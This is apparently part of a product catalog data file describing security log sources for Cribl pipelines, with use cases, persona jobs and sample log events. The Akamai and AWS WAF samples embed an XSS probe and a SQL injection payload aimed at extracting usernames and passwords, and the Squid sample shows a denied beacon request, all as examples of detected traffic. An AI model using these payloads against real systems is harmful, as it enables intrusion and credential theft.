        useCases: ['Network Traffic Analysis', 'Lateral Movement Detection', 'Data Exfiltration', 'Bandwidth Monitoring', 'Top Talker Identification', 'Service Dependency Mapping', 'DDoS Detection', 'Capacity Planning', 'Anomalous Port Usage', 'Peer-to-Peer Detection'],
        personas: ['Network Security', 'SOC', 'NOC', 'Network Engineering', 'Security Engineering', 'SRE', 'Capacity Planning'],
        jobsToBeDone: [
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Identify top-10 bandwidth consumers and detect traffic anomalies exceeding 2x baseline within 5-minute windows' },
            { persona: 'Data End User / Analyst', job: 'Map application service dependencies using flow records to validate microsegmentation policies across 100+ subnets' },
            { persona: 'Jack of All Trades', job: 'Detect DDoS volumetric attacks by correlating flow rate spikes with interface utilization thresholds' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build lateral movement detection rules using internal-to-internal flow patterns on non-standard ports with <3 min alerting' },
            { persona: 'Data End User / Analyst', job: 'Identify data exfiltration by flagging outbound flows exceeding 500MB to external IPs not in approved destination lists' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Aggregate sampled flow records into 1-minute summaries for capacity planning, reducing storage by 85-90% vs raw flows' },
            { persona: 'Data Engineer', job: 'Route security-relevant flows (denied, non-standard ports, high volume) to SIEM while sending aggregated metrics to monitoring tools' },
            { persona: 'Team Leader', job: 'Demonstrate flow data cost optimization ROI by comparing raw vs aggregated storage costs across retention periods' }
          ]},
          { category: 'Platform Operations', jobs: [
            { persona: 'Platform Administrator', job: 'Scale NetFlow collection to handle 500K+ flows/sec across 200+ exporters with zero packet loss at the collector' },
            { persona: 'Data Onboarder', job: 'Deploy NetFlow v5/v9 collection on Cribl Stream with template caching and multi-exporter support within 1 hour' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Elastic Security', 'Datadog', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cribl Stream (NetFlow/IPFIX Collector input) / Cribl Edge (flow collector) / UDP receiver on port 2055/9995',
        logFormat: 'Binary NetFlow v5 (fixed 48-byte records) or v9 (template-based). Decoded fields: src_addr, dst_addr, src_port, dst_port, protocol, bytes, packets, tcp_flags, tos, src_as, dst_as, input_snmp, output_snmp, first_switched, last_switched, flow_duration.',
        avgEPS: '10,000-500,000 flows/sec depending on router count and sampling rate',
        sampleEvent: '{"flow_version":9,"src_addr":"10.1.2.100","dst_addr":"203.0.113.50","src_port":52341,"dst_port":443,"protocol":6,"bytes":15234,"packets":25,"tcp_flags":"0x1b","tos":0,"src_as":64512,"dst_as":13335,"input_snmp":2,"output_snmp":3,"first_switched":"2026-06-06T14:32:01Z","last_switched":"2026-06-06T14:32:08Z","flow_duration_ms":7000,"sampling_rate":1000,"exporter_ip":"10.0.0.1"}'
      },
      {
        id: 'ipfix',
        name: 'IPFIX (IP Flow Information Export)',
        vendor: 'IETF Standard / Multiple',
        description: 'IP Flow Information Export (IPFIX, RFC 7011) — the IETF standard evolution of NetFlow v9. Provides template-based flow records with variable-length fields, enterprise-specific Information Elements, bidirectional flows (biflow), structured data types, and SCTP transport reliability. Supported by Cisco, Juniper, Palo Alto, Fortinet, and most modern network infrastructure.',
        status: 'available',
        useCases: ['Advanced Traffic Analysis', 'Application Performance Monitoring', 'Encrypted Traffic Classification', 'Lateral Movement Detection', 'Network Forensics', 'Capacity Planning', 'SLA Verification', 'QoS Monitoring', 'Microsegmentation Validation', 'Cloud VPC Flow Analysis'],
        personas: ['Network Security', 'SOC', 'NOC', 'Network Engineering', 'Security Engineering', 'SRE', 'Cloud Security'],
        jobsToBeDone: [
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor bidirectional flow metrics and application classification to validate QoS policy effectiveness across WAN links' },
            { persona: 'Data End User / Analyst', job: 'Perform encrypted traffic classification using flow metadata to identify application types without decryption' },
            { persona: 'Jack of All Trades', job: 'Validate microsegmentation policies by comparing actual IPFIX flows against intended east-west traffic matrices' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Create advanced lateral movement detections using biflow records with enterprise-specific Information Elements for richer context' },
            { persona: 'Data End User / Analyst', job: 'Detect covert channels in encrypted traffic by analyzing flow duration, packet size distribution, and timing patterns' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Deduplicate bidirectional flows and aggregate into session summaries, reducing storage volume by 80-90% vs raw IPFIX records' },
            { persona: 'Data Engineer', job: 'Extract enterprise-specific IEs (application name, HTTP host) for security analytics while discarding raw flow padding fields' },
            { persona: 'Team Leader', job: 'Compare IPFIX collection cost at various sampling rates and demonstrate optimal cost-to-detection trade-off points' }
          ]},
          { category: 'Platform Operations', jobs: [
            { persona: 'Platform Administrator', job: 'Manage IPFIX template caching across multi-vendor exporters (Cisco, Juniper, Palo Alto) with zero template timeout gaps' },
            { persona: 'Data Onboarder', job: 'Deploy IPFIX collection with SCTP transport reliability and template auto-discovery within 1 hour for 100+ exporters' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Elastic Security', 'Datadog', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cribl Stream (NetFlow/IPFIX Collector input) / Cribl Edge (flow collector) / UDP/TCP/SCTP on port 4739/4740',
        logFormat: 'Binary IPFIX (RFC 7011) with template and data sets. Supports enterprise IEs (PEN-based), variable-length strings, structured data (basicList, subTemplateList). Common IEs: sourceIPv4Address, destinationIPv4Address, sourceTransportPort, destinationTransportPort, protocolIdentifier, octetDeltaCount, packetDeltaCount, flowStartMilliseconds, flowEndMilliseconds, applicationId.',
        avgEPS: '10,000-1,000,000 flows/sec depending on infrastructure and sampling',
        sampleEvent: '{"observation_domain_id":256,"src_addr":"10.1.2.100","dst_addr":"203.0.113.50","src_port":52341,"dst_port":443,"protocol":6,"octet_delta_count":15234,"packet_delta_count":25,"tcp_control_bits":"0x1b","ip_class_of_service":0,"bgp_src_as":64512,"bgp_dst_as":13335,"ingress_interface":2,"egress_interface":3,"flow_start_ms":"2026-06-06T14:32:01.000Z","flow_end_ms":"2026-06-06T14:32:08.000Z","flow_duration_ms":7000,"application_id":"443:SSL","http_host":"api.example.com","sampling_interval":1000,"exporter_ipv4":"10.0.0.1","biflow_direction":"initiator"}'
      }
    ]
  },
  {
    category: 'Proxy / Web',
    icon: '🔗',
    sources: [
      {
        id: 'nginx-access',
        name: 'NGINX Access & Error Logs',
        vendor: 'NGINX / F5',
        description: 'Web server and reverse proxy access logs capturing client requests, upstream response timing, HTTP status codes, cache behavior, and TLS details. Includes error logs for upstream failures and connection issues.',
        status: 'available',
        useCases: ['Web Application Attacks', 'Brute Force Detection', 'Bot/Scanner Detection', 'Upstream Latency Monitoring', 'Error Rate Alerting', 'Cache Performance', 'Traffic Volume Analysis', 'Path Traversal Detection'],
        personas: ['Security Engineering', 'SOC', 'SRE', 'Platform Engineering', 'Application Team'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detection rules for path traversal, brute force (5+ 401s in 60s), and bot/scanner fingerprints with automated blocking recommendations' },
            { persona: 'Data End User / Analyst', job: 'Investigate web application attack campaigns by correlating source IPs, user agents, and URI patterns across upstream pools' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor upstream response time p95/p99 and error rates per pool member to detect backend degradation within 60 seconds' },
            { persona: 'Data End User / Analyst', job: 'Track cache hit ratios and bandwidth consumption by virtual host to optimize CDN and origin configurations' },
            { persona: 'Jack of All Trades', job: 'Correlate 5xx error spikes with deployment events and upstream pool health to reduce MTTR by 50%' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Suppress health check and static asset request logs (images, CSS, JS) reducing NGINX log volume by 40-60% for SIEM' },
            { persona: 'Data Engineer', job: 'Route 2xx/3xx status logs to Lake for analytics while sending only 4xx/5xx and security-relevant events to SIEM in real time' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Collect NGINX access logs via Cribl Edge file monitor with automatic log rotation handling within 15 minutes' },
            { persona: 'Data Engineer', job: 'Parse custom NGINX log formats and enrich with geo-IP and threat intel lookups before multi-destination routing' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Datadog', 'Dynatrace', 'New Relic', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cribl Edge (File Monitor) / Syslog / Container stdout (JSON)',
        sampleEvent: '192.168.1.47 - jperks [06/Jun/2026:14:32:07 -0500] "GET /api/v2/customers/acme/health HTTP/1.1" 200 1534 "https://app.cribl.io/dashboards" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" 0.038 0.036 10.0.5.12:8080 200'
      },
      {
        id: 'apache-access',
        name: 'Apache HTTP Server Logs',
        vendor: 'Apache Software Foundation',
        description: 'Apache HTTP Server access and error logs in Combined Log Format (CLF) or custom formats. Captures client requests, response codes, bytes transferred, referrer, user agent, virtual host, mod_security alerts, and SSL/TLS details. Includes error logs with module-level diagnostics.',
        status: 'available',
        useCases: ['Web Application Attacks', 'Brute Force Detection', 'Bot/Scanner Detection', 'Error Rate Monitoring', 'Path Traversal Detection', 'SQL Injection Attempts', 'Bandwidth Abuse', 'SSL Certificate Issues', 'Slow Request Identification'],
        personas: ['Security Engineering', 'SOC', 'SRE', 'Platform Engineering', 'Application Development', 'NOC'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 6+ detection rules for SQL injection, XSS attempts, path traversal, and brute force patterns with OWASP Top 10 coverage' },
            { persona: 'Data End User / Analyst', job: 'Investigate web attack campaigns by tracing malicious request sequences across virtual hosts and correlating with mod_security alerts' },
            { persona: 'Jack of All Trades', job: 'Detect credential stuffing attacks by identifying distributed login failures from rotating source IPs within sliding windows' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor error rates by virtual host and detect 5xx spike trends exceeding 2x baseline with 90-second alerting latency' },
            { persona: 'Data End User / Analyst', job: 'Track slow request patterns (>500ms) by endpoint path to identify backend bottlenecks before SLA breach' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter static asset requests and health probes from access logs, reducing Apache log volume by 45-65% for SIEM delivery' },
            { persona: 'Data Engineer', job: 'Route full access logs to Lake at storage cost while sending security-filtered subset (4xx, 5xx, mod_security) to SIEM' },
            { persona: 'Team Leader', job: 'Quantify Apache log optimization savings by comparing pre/post ingestion volumes across all monitored web servers' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Deploy Cribl Edge file monitor for Apache Combined Log Format with log rotation support across 25+ servers in under 1 hour' },
            { persona: 'Data Engineer', job: 'Parse custom Apache LogFormat directives and normalize to common web access schema for cross-server correlation' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Datadog', 'Dynatrace', 'New Relic', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cribl Edge (File Monitor on /var/log/apache2/ or /var/log/httpd/) / rsyslog / piped logging',
        sampleEvent: '203.0.113.42 - jperks [06/Jun/2026:14:32:08 -0500] "POST /api/v1/accounts/login HTTP/1.1" 200 1247 "https://app.example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" 350ms TLSv1.3 ECDHE-RSA-AES256-GCM-SHA384'
      },
      {
        id: 'iis-access',
        name: 'Microsoft IIS Access Logs',
        vendor: 'Microsoft',
        description: 'Internet Information Services (IIS) W3C Extended Log Format access logs capturing HTTP requests, response codes, server/client IPs, time-taken, bytes sent/received, substatus codes, Win32 error codes, and custom fields. Supports Advanced Logging module for additional headers and response data.',
        status: 'available',
        useCases: ['Web Application Attacks', 'Authentication Failures', 'Slow Response Detection', 'Error Rate Monitoring', 'Bot/Scanner Detection', 'Path Traversal', 'IIS Health Monitoring', 'Application Pool Issues', 'SSL/TLS Audit', 'Bandwidth Analysis'],
        personas: ['Security Engineering', 'SOC', 'SRE', 'Platform Engineering', 'Application Development', '.NET Team'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detection rules for authentication failures (401/403 sequences), path traversal attempts, and anomalous substatus codes indicating exploitation' },
            { persona: 'Data End User / Analyst', job: 'Investigate web attacks using IIS substatus and Win32 error codes to differentiate application bugs from active exploitation' },
            { persona: 'Jack of All Trades', job: 'Detect bot/scanner activity by correlating high request rates with missing or anomalous user-agent strings across site bindings' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor time-taken field percentiles per application pool to detect worker process degradation before user-facing impact' },
            { persona: 'Data End User / Analyst', job: 'Track application pool recycles and 503 errors to identify memory leaks and resource exhaustion patterns' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter health probe requests and static content logs from IIS W3C output, reducing SIEM volume by 50-70% per server' },
            { persona: 'Data Engineer', job: 'Route full IIS logs to Lake while sending only security-relevant status codes (4xx/5xx) and high time-taken events to SIEM' },
            { persona: 'Team Leader', job: 'Present per-server IIS log cost reduction metrics with breakdowns by site binding and application pool' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Deploy Cribl Edge on Windows IIS servers with W3C log parsing and field extraction within 20 minutes per server' },
            { persona: 'Platform Administrator', job: 'Standardize IIS logging fields across 100+ servers using centralized Edge fleet configuration and field normalization' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Datadog', 'Dynatrace', 'New Relic', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cribl Edge (File Monitor on C:\\inetpub\\logs\\) / Windows Event Forwarding / HTTP Logging module / ETW tracing',
        sampleEvent: '2026-06-06 14:32:08 W3SVC1 WEBSERVER01 10.1.2.50 POST /api/v1/accounts/login - 443 jperks@corp.local 203.0.113.42 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) https://app.example.com/login 200 0 0 1247 2845 350'
      },
      {
        id: 'akamai-waf',
        name: 'Akamai WAF / App & API Protector',
        vendor: 'Akamai Technologies',
        description: 'Web Application Firewall event logs from Akamai App & API Protector (formerly Kona Site Defender). Captures HTTP request details, WAF rule triggers, bot management decisions, rate limiting actions, API security events, client reputation scores, and geographic access controls. Delivered via SIEM Integration (CEF/JSON) or DataStream 2.',
        status: 'available',
        useCases: ['Web Application Attacks', 'Bot Mitigation', 'API Abuse Detection', 'DDoS Layer 7', 'Rate Limiting Enforcement', 'Credential Abuse', 'SQL Injection / XSS', 'Geographic Blocking', 'False Positive Tuning', 'Attack Campaign Correlation'],
        personas: ['Security Engineering', 'SOC', 'Application Security', 'Platform Engineering', 'NOC', 'API Team'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 10+ detection rules covering XSS, SQLi, bot attacks, credential abuse, and API abuse patterns with WAF rule ID correlation' },
            { persona: 'Data End User / Analyst', job: 'Investigate attack campaigns by correlating WAF rule triggers with client reputation scores and geographic anomalies' },
            { persona: 'Jack of All Trades', job: 'Identify false positive patterns by comparing WAF alert rates against legitimate traffic baselines per application endpoint' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter informational WAF events (score <50) and keep only actionable alerts, reducing SIEM volume by 60-75%' },
            { persona: 'Data Engineer', job: 'Route full DataStream 2 feeds to Lake for forensic replay while sending only high-confidence (score 80+) alerts to SIEM' },
            { persona: 'Team Leader', job: 'Report WAF event cost optimization with clear mapping of retained detection value vs reduced ingestion spend' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor DDoS Layer 7 rate limiting effectiveness and identify application endpoints under sustained attack within 2 minutes' },
            { persona: 'Data End User / Analyst', job: 'Track bot management challenge pass/fail rates to measure bot mitigation effectiveness across protected properties' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Akamai SIEM Integration API polling or DataStream 2 HTTP delivery into Cribl Stream within 45 minutes' },
            { persona: 'Data Engineer', job: 'Decode base64 attack payloads and enrich WAF events with threat classification before routing to security analytics' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Datadog', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Akamai SIEM Integration API (HTTPS polling) / DataStream 2 (HTTP POST to Cribl) / S3 delivery / Splunk HEC format',
        logFormat: 'JSON (SIEM Integration) or structured key-value (DataStream 2). Includes attack_data object with rule IDs, risk scores, and action taken. Bot events include bot_score, bot_category, and challenge results.',
        avgEPS: '5,000-100,000 EPS depending on site traffic and attack volume',
        sampleEvent: '{"type":"akamai_siem","format":"json","version":"1.0","attackData":{"rules":[{"ruleId":"950002","ruleTag":"XSS","ruleAction":"alert","ruleMessage":"Cross-site Scripting (XSS) Attack","ruleSelector":"ARGS:q"}],"ruleActions":"QWxlcnQ=","clientIP":"203.0.113.42","configId":"12345","policyId":"pol_abc123"},"httpMessage":{"requestId":"1a2b3c4d","start":"2026-06-06T14:32:08Z","method":"GET","host":"www.example.com","path":"/search","query":"q=%3Cscript%3Ealert(1)%3C/script%3E","port":"443","protocol":"HTTP/1.1","status":"403","bytes":"1247","requestHeaders":{"User-Agent":"Mozilla/5.0","X-Forwarded-For":"198.51.100.42"},"responseHeaders":{"Content-Type":"text/html"}},"geo":{"country":"US","city":"Dallas","lat":"32.7767","long":"-96.7970","regionCode":"TX","asn":"16509"},"botData":{"botScore":"85","botCategory":"WEB_SCRAPER","challengePassed":false}}'
      },
      {
        id: 'squid-proxy',
        name: 'Squid / Forward Proxy Access Logs',
        vendor: 'Squid Project (Open Source) / Blue Coat / Broadcom',
        description: 'Forward proxy access logs capturing all outbound HTTP/HTTPS requests from endpoint users and servers. Logs include client IP, requested URL (CONNECT for HTTPS), HTTP method, response code, bytes transferred, cache result codes (HIT/MISS/DENIED), content type, and request duration. Covers Squid, Blue Coat ProxySG, and Symantec Web Protection Suite in native or ELFF (Extended Log File Format).',
        status: 'available',
        useCases: ['C2 Callback Detection', 'Data Exfiltration Monitoring', 'DGA Domain Detection', 'Policy Violation', 'Bandwidth Abuse', 'Cache Performance', 'Shadow IT Discovery', 'Malware Download Detection', 'User Activity Monitoring'],
        personas: ['SOC', 'Security Engineering', 'NOC', 'Network Security', 'Threat Hunting', 'Compliance', 'FinOps'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build C2 beaconing detections by identifying endpoints making periodic requests (fixed interval ±jitter) to low-reputation domains with small response sizes and consistent User-Agent strings' },
            { persona: 'Data End User / Analyst', job: 'Detect data exfiltration by identifying CONNECT sessions or POST requests with abnormally large request body sizes to external hosts outside business hours' },
            { persona: 'Data Content Creator', job: 'Identify DGA domains by analyzing proxy access logs for requests to domains with high entropy scores, recently registered TLDs, and no prior DNS cache hits' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor proxy cache hit ratios per content category and identify upstream origin latency degradation causing user-visible slowness within 2 minutes' },
            { persona: 'Data End User / Analyst', job: 'Track bandwidth consumption by category (streaming, file sharing, cloud storage) to enforce acceptable use policies and identify shadow IT SaaS adoption' },
            { persona: 'NOC', job: 'Detect proxy capacity exhaustion by monitoring concurrent connection counts, TCP_DENIED rates, and client-side timeout increases across proxy clusters' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter routine TCP_HIT/TCP_MEM_HIT cache hit log lines (often 30-50% of volume) and 200 OK responses to known-good domains while preserving all DENIED, CONNECT, and unusual response codes for security analysis' },
            { persona: 'Data Engineer', job: 'Route TCP_DENIED, authentication failures, and requests to uncategorized/high-risk domains to SIEM while batching full access logs to Lake for compliance retention and bandwidth analytics' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Squid access.log collection via Cribl Edge file monitor or syslog output, parse native Squid log format (timestamp, duration, client, result/status, bytes, method, URL, hierarchy, content_type) within 15 minutes' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'File monitor (access.log) / Syslog / ICAP integration / Blue Coat ELFF via syslog',
        logFormat: 'Squid native: timestamp.ms duration client_ip result_code/status bytes method URL user hierarchy/peer content_type. Blue Coat ELFF: date, time, time-taken, c-ip, cs-username, s-action, sc-status, cs-method, cs-uri-scheme, cs-host, cs-uri-path, cs-uri-query, sc-bytes, cs-bytes, cs-categories, cs-threat-risk.',
        avgEPS: '10,000-500,000 EPS (every outbound web request from every endpoint; HTTPS CONNECT logs add volume)',
        sampleEvent: '1718544728.234    145 10.0.1.50 TCP_MISS/200 89234 CONNECT login.microsoftonline.com:443 jperks@corp HIER_DIRECT/20.190.159.0 -\n1718544728.567     23 10.0.1.51 TCP_DENIED/407 3821 GET http://suspicious-domain.xyz/beacon.php - HIER_NONE/- text/html\n1718544728.891   2345 10.0.1.52 TCP_TUNNEL/200 15234567 CONNECT mega.nz:443 mthompson@corp HIER_DIRECT/31.216.148.0 -'
      },
      {
        id: 'aws-waf-logs',
        name: 'AWS WAF Logs',
        vendor: 'Amazon Web Services',
        description: 'Web Application Firewall logs from AWS WAF capturing every request evaluated against WAF rules attached to ALBs, CloudFront distributions, API Gateway, and AppSync. Includes full HTTP request metadata, matched rule details, rate-based rule counts, Bot Control classifications, and action taken (ALLOW, BLOCK, COUNT, CAPTCHA). Delivers granular visibility into web application attack attempts and bot traffic.',
        status: 'available',
        useCases: ['SQL Injection Detection', 'XSS Attack Blocking', 'Bot Management', 'Rate Limiting', 'Geo-Blocking', 'API Abuse Prevention', 'False Positive Tuning', 'DDoS Layer 7', 'OWASP Top 10 Protection', 'IP Reputation Filtering'],
        personas: ['Security Engineering', 'SOC', 'Application Security', 'Platform Engineering', 'DevSecOps', 'SRE'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build multi-signal detections correlating AWS WAF BLOCK actions with ALB access logs to identify persistent attackers rotating IPs — match on URI patterns, User-Agent fingerprints, and request timing across rule group matches' },
            { persona: 'Data End User / Analyst', job: 'Investigate web application attacks by analyzing WAF rule match details including the specific rule group (SQLi, XSS, known-bad-inputs) and terminating rule to assess attack sophistication and intent' },
            { persona: 'Data Content Creator', job: 'Detect API abuse by combining WAF rate-based rule triggers with Bot Control classifications to differentiate legitimate high-volume clients from credential stuffing bots and scrapers' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor WAF request volume and rule evaluation counts to detect capacity issues, and track CAPTCHA challenge completion rates to measure bot mitigation effectiveness per WebACL' },
            { persona: 'Data End User / Analyst', job: 'Analyze false positive rates by rule group to tune managed rule sets — identify legitimate traffic blocked by overly aggressive SQL injection or XSS rules and create targeted exceptions' },
            { persona: 'SRE', job: 'Correlate WAF BLOCK spike events with application availability metrics to ensure WAF rules are not inadvertently blocking legitimate users during traffic surges' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter WAF ALLOW logs for known-good traffic (authenticated users, internal health checks) — typically 70-85% of volume — while preserving all BLOCK, COUNT, and CAPTCHA events for security analysis' },
            { persona: 'Data Engineer', job: 'Route WAF BLOCK and high-confidence bot events to SIEM for real-time alerting while batching full WAF logs (including ALLOW) to Lake for false positive tuning and compliance retention' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Enable WAF logging to Kinesis Data Firehose (prefix aws-waf-logs-) and configure Cribl Stream HTTP source to receive, or use S3 delivery with SQS notification — operational within 20 minutes per WebACL' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Kinesis Data Firehose (HTTP endpoint or S3) / S3 direct delivery / CloudWatch Logs',
        logFormat: 'JSON (NDJSON). Key fields: timestamp, formatVersion, webaclId, terminatingRuleId, terminatingRuleType, action (ALLOW/BLOCK/COUNT/CAPTCHA), httpSourceName (ALB/CF/APIGW), httpSourceId, ruleGroupList[].terminatingRule, rateBasedRuleList[], httpRequest (clientIp, country, uri, method, httpVersion, headers[]), labels[] (awswaf:managed:bot:verified, etc).',
        avgEPS: '10,000-5,000,000 EPS (every request evaluated by WAF generates a log; high-traffic ALBs with Bot Control produce millions per hour)',
        sampleEvent: '{"timestamp":1718544728234,"formatVersion":1,"webaclId":"arn:aws:wafv2:us-east-1:123456789012:regional/webacl/prod-api-waf/abc123","terminatingRuleId":"AWS-AWSManagedRulesSQLiRuleSet","terminatingRuleType":"MANAGED_RULE_GROUP","action":"BLOCK","terminatingRuleMatchDetails":[{"conditionType":"SQL_INJECTION","location":"QUERY_STRING","matchedData":["1 OR 1=1","UNION SELECT"]}],"httpSourceName":"ALB","httpSourceId":"app/prod-api-alb/abc123","ruleGroupList":[{"ruleGroupId":"AWS#AWSManagedRulesSQLiRuleSet","terminatingRule":{"ruleId":"SQLi_QUERYARGUMENTS","action":"BLOCK"},"excludedRules":[]}],"rateBasedRuleList":[],"nonTerminatingMatchingRules":[],"httpRequest":{"clientIp":"203.0.113.42","country":"RU","uri":"/api/v2/users","args":"id=1%20OR%201%3D1%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--","httpMethod":"GET","requestId":"abc-123-def","headers":[{"name":"User-Agent","value":"sqlmap/1.7"},{"name":"Host","value":"api.example.com"}]},"labels":[{"name":"awswaf:managed:aws:sql-database:SQLi_QueryArguments"}]}'
      }
    ]
  },
  {
    category: 'SASE / Zero Trust',
    icon: '🌍',
    sources: [
      {
        id: 'prisma-access-traffic',
        name: 'Prisma Access Traffic & Threat Logs',
        vendor: 'Palo Alto Networks',
        description: 'Cloud-delivered firewall traffic, threat prevention, URL filtering, and file blocking logs from Prisma Access (SASE). Captures session-level network activity through the Prisma Access cloud gateways including user identity, application identification, threat verdicts, WildFire analysis results, and data filtering policy actions. Events delivered via Cortex Data Lake or Syslog.',
        status: 'available',
        useCases: ['Remote Worker Threat Detection', 'SaaS Application Monitoring', 'Data Exfiltration Prevention', 'Malware Delivery Blocking', 'URL Category Enforcement', 'Zero Trust Policy Violations', 'Bandwidth Abuse Detection', 'Application Usage Analytics', 'Compliance Monitoring'],
        personas: ['SOC', 'Security Engineering', 'Network Security', 'Cloud Security', 'Compliance', 'NOC'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 8+ detection rules for remote worker threats including malware downloads, C2 callbacks, and data exfiltration via SaaS apps' },
            { persona: 'Data End User / Analyst', job: 'Investigate zero trust policy violations by correlating user identity, application, and threat verdict across SASE gateways' },
            { persona: 'Jack of All Trades', job: 'Detect compromised remote endpoints by identifying WildFire malicious verdicts paired with unusual application usage patterns' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Reduce Prisma Access traffic log volume by 45-60% by suppressing allowed SaaS health checks and CDN requests while preserving threat events' },
            { persona: 'Data Engineer', job: 'Route threat and URL filtering logs to SIEM in real time while batching full traffic logs to Lake at 10x lower cost' },
            { persona: 'Team Leader', job: 'Demonstrate SASE log optimization ROI with per-gateway volume reduction metrics and maintained detection SLA' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Ensure all remote worker traffic logs are retained for 13 months with tamper-proof storage for regulatory compliance' },
            { persona: 'Data End User / Analyst', job: 'Generate compliance reports showing URL category enforcement effectiveness and policy violation trends by user group' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Cortex Data Lake API collection via REST Collector with pagination handling and deliver parsed events within 1 hour' },
            { persona: 'Data Engineer', job: 'Normalize Prisma Access traffic/threat/URL logs into unified SASE schema for cross-product correlation with GlobalProtect events' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Datadog', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cortex Data Lake (HTTPS API to Cribl REST Collector) / Syslog (CEF/LEEF via Log Forwarding profile) / HTTPS Log Streaming',
        logFormat: 'CSV (syslog) or JSON (Cortex Data Lake API). Same field structure as PAN-OS TRAFFIC/THREAT/URL logs with additional SASE-specific fields: mobile_user, GlobalProtect_gateway, service_connection, remote_network.',
        avgEPS: '10,000-200,000 EPS depending on user population and gateway count',
